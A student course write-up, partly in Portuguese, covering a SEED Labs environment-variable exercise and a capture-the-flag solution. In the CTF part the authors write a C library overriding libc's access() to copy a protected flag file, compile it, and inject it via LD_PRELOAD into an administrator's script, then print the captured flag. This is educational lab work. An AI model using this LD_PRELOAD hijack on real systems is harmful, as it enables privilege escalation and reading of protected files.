# Semana 4

## SEED Labs – Environment Variable and Set-UID Program

### Task 1

We started by using the command `env` to print out the environment variables.

![image](assets/s4i1.png)

Then, we tried to create a new variable:

``` 
export HELLO ="Hello!"
```

And verified it exists by using `env` once again.

![image](assets/s4i2.png)

### Task 2

We compiled myprintenv.c twice. 

## CTF - Linux Environment

O objetivo deste desafio CTF era capturar a flag contida no diretório `flag`, para o qual não tínhamos permissão de acesso. Uma vez que o sistema estava em modo "read only", foi necessário localizar o diretório `tmp`.

```
cd ../../tmp
```
Ao ler e completar a Tarefa 7 do Lab desta semana, aprendemos que é possível sobrescrever funções da library libc. Para tal, temos primeiro de criar uma "dynamic linked library" do comando `access`.

```
#include <stdio.h>
#include <stdlib.h>
int access(const char *pathname, int mode) {
    system("/bin/cat /flags/flag.txt > /tmp/flag");
    return 0;
    }
```

Este programa, ao qual demos o nome de `access.c`, será usado para substituir a função `access` quando o script do administrador for executado novamente.

O `access.c` executa `system()`, no qual utilizamos o comando `cat` para redirecionar o conteúdo que deveria ser escrito em `/flags/flags.txt` para o novo ficheiro `flag`, localizado no diretório `tmp`. Ao criar este ficheiro, também alteramos as suas permissões de forma a conceder permissões de escrita, leitura e execução a qualquer utilizador/grupo/outros.

```
touch flag
chmod 777 flag
```

Após criar o ficheiro `flag` e o programa `access.c`,compilamos este da seguinte maneira:

```
gcc -fPIC -g -c access.c 
gcc -shared -o libaccess.so.1.0.1 access.o -lc
```
Mesmo tendo criado uma `dynamic linked library` e connectado à `C library` usando `-lc`, também é necessário adicionar a seguinte variável de ambiente:

```
echo "LD_PRELOAD=/tmp/libaccess.so.1.0.1" > env
```
Esta variável de ambiente faz com que ao executar o script, relendo todas as livrarias, esta seja a primeira a ser lida.

É possível verificar se esta variável foi criada ao executar o comando `cat env`. Dessa forma, concluímos os passos necessários para obter a flag. Restava apenas esperar que o script fosse executado novamente para obter a flag.

Observamos que quando o script era executado, a variável de ambiente desaparecia do `env`, o que indicava que a flag já estava no ficheiro `flag` no diretório `tmp`. Assim, conseguimos obter a seguinte flag.


```
flag{b9cda820a8be213b709eeb1aa2f4725f}
```

